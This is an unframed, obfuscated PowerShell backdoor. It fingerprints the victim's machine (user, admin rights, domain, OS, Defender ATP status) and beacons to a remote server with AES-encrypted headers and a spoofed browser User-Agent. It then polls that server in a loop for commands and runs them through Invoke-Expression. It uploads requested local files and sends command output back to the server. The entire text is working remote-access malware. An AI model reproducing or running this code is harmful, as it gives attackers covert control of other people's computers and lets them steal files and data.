$PSDC = 5; $EKBPSSQYB = "V0lMVElORVdLRFNXWklaQlFFQ1ZSRFBBSVZaS01ITFM="; $DTWUS = "WUhXRU9FQU1HVEpVRlZGTA==" function XZ($EKBPSSQYB, $DTWUS) { $EPIESH = New-Object "System.Security.Cryptography.AesManaged" $EPIESH.Mode = [System.Security.Cryptography.CipherMode]::CBC $EPIESH.Padding = [System.Security.Cryptography.PaddingMode]::Zeros $EPIESH.BlockSize = 128 $EPIESH.KeySize = 256 if ($DTWUS) { if ($DTWUS.getType().Name -eq "String") { $EPIESH.IV = [System.Convert]::FromBase64String($DTWUS) } else { $EPIESH.IV = $DTWUS } } if ($EKBPSSQYB) { if ($EKBPSSQYB.getType().Name -eq "String") { $EPIESH.Key = [System.Convert]::FromBase64String($EKBPSSQYB) } else { $EPIESH.Key = $EKBPSSQYB } } $EPIESH } function UAM($EKBPSSQYB, $DTWUS, $unencryptedString) { $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString) $EPIESH = XZ $EKBPSSQYB $DTWUS $ZOC = $EPIESH.CreateEncryptor() $encryptedData = $ZOC.TransformFinalBlock($bytes, 0, $bytes.Length); [System.Convert]::ToBase64String($encryptedData) } function B($EKBPSSQYB, $DTWUS, $cipher) { $bytes = [System.Convert]::FromBase64String($cipher) $EPIESH = XZ $EKBPSSQYB $DTWUS $decryptor = $EPIESH.CreateDecryptor(); $DB = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length); [System.Text.Encoding]::UTF8.GetString($DB).Trim([char]0) } $progressPreference = 'silentlyContinue'; $wc = New-Object system.Net.WebClient; $wc2 = New-Object system.Net.WebClient; $wcr = New-Object system.Net.WebClient; $hostname = $env:COMPUTERNAME; $FG = UAM $EKBPSSQYB $DTWUS $hostname $EAJRWURY = -join ((65..90) | Get-Random -Count 5 | % {[char]$_}); $r2 = $EAJRWURY; $JUDRIEG = "$hostname-$r2"; $YFAVMLF = $env:USERNAME; $whmenc = UAM $EKBPSSQYB $DTWUS $YFAVMLF $YP = (Get-WmiObject Win32_OperatingSystem).OSArchitecture $KLD = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($YP)"; $WHO = (Get-WmiObject Win32_ComputerSystem).Domain; $procarch = [Environment]::Is64BitProcess $procarchf = "" if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"} $pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf" $user_identity = [Security.Principal.WindowsIdentity]::GetCurrent(); $iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) if($iselv){ $YFAVMLF = $YFAVMLF + "*" } $random = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status" -Name OnboardingState -ErrorAction SilentlyContinue).OnboardingState;if($random -eq $null){$atp = $false}else{$atp = $true} $raw_header = "$JUDRIEG,$YFAVMLF,$KLD,$pnid,$WHO,$atp"; $encrypted_header = UAM $EKBPSSQYB $DTWUS $raw_header; $final_hostname_encrypted = UAM $EKBPSSQYB $DTWUS $JUDRIEG $wch = $wc.headers; $wch.add("Authorization", $encrypted_header); $wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"); $wc.downloadString("https://electrogas-malta.com:443/login"); $failure_counter = 0; while($true){ try{ $command_raw = $wc2.downloadString("https://electrogas-malta.com:443/view/$JUDRIEG"); }catch{ $failure_counter=$failure_counter +1; if ($failure_counter -eq 10){ kill $pid } } #$final_command = B $EKBPSSQYB $DTWUS $command_raw #$fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21) $fc = $command_raw; if(($fc -eq "") -Or ($fc -eq "False") ){ } elseif($fc -eq "Report"){ $ps = foreach ($i in Get-Process){$i.ProcessName}; $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n"); $ps+= $arr -join ";" $ps+= (Get-WmiObject -Class win32_operatingSystem).version; $ps+= (Get-WinSystemLocale).Name $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)" $pst = UAM $EKBPSSQYB $DTWUS $ps $wcrh = $wcr.Headers; $wcrh.add("Authorization", $pst); $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"); $wcrh.add("App-Logic", $FG); $wcr.downloadString("https://electrogas-malta.com:443/calls"); } elseif($fc.split(" ")[0] -eq "Download"){ $filename = UAM $EKBPSSQYB $DTWUS $fc.split("\")[-1] $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1]) $GWODBRCJU = [Convert]::ToBase64String($file_content); $efc = UAM $EKBPSSQYB $DTWUS $GWODBRCJU; $AWUHJ = new-object net.WebClient; $PS = $AWUHJ.Headers; $PS.add("Content-Type", "application/x-www-form-urlencoded"); $PS.add("x-Authorization", $whmenc); $AWUHJ.UploadString("https://electrogas-malta.com:443/messages", "fn=$filename&token=$efc"); } elseif($fc -eq "reset-ps"){ try{ # Reset Powershell session (clean) # NOT IMPLEMENTED YET $ec = "NO"; } catch{ $ec = $Error[0] | Out-String; } $GWODBRCJU = UAM $EKBPSSQYB $DTWUS $ec; $AWUHJ = New-Object system.Net.WebClient; $AWUHJ.Headers["App-Logic"] = $final_hostname_encrypted; $AWUHJ.Headers["Authorization"] = $GWODBRCJU; $AWUHJ.Headers["Session"] = $command_raw; $AWUHJ.downloadString("https://electrogas-malta.com:443/bills"); } else{ try{ #Write-Host "Executing command"; #Write-Host $fc; #$ec = IEX($fc); $ec = Invoke-Expression ($fc) | Out-String; #Write-Host "Result:"; #Write-Host $ec; } catch{ $ec = $Error[0] | Out-String; } $ecbytes = [System.Text.Encoding]::UTF8.GetBytes($ec); $GWODBRCJU = [System.Convert]::ToBase64String($ecbytes); $UrlGWODBRCJU = $GWODBRCJU.replace('=','%3D'); $AWUHJ = New-Object system.Net.WebClient; $AWUHJ.Headers["App-Logic"] = $final_hostname_encrypted; $AWUHJ.Headers["Authorization"] = "rGa4AGAMDSFAS34eaTfx"; $AWUHJ.Headers["Session"] = $command_raw; $AWUHJ.UploadString("https://electrogas-malta.com:443/bills", "test=" + $UrlGWODBRCJU); #$AWUHJ.downloadString("https://electrogas-malta.com:443/bills"); } sleep $PSDC; }
